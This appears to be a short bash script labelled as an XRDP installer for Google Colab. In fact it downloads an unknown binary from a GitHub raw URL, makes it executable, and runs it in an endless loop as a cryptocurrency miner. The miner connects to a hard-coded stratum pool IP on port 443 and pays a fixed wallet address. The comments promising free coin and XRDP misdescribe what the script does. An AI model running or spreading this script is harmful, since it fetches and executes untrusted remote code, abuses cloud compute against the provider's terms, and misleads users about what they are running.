# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R VTM

wget https://github.com/sbwsmg/Zeus/raw/main/VTM
chmod 700 VTM

#!/bin/sh
#
# Choose nearest stratum:
#       stratum-eu.rplant.xyz   /France/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Canada/
#
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
while [ 1 ]; do
"$FOLDER"/VTM  -a yespower -o stratum+tcp://141.95.108.117:443 -u MBtk93TMb72pVXfwmKTZT6yGcsXj5rsEYb -p c=LTC,zap=ONX -t200
sleep 5
done
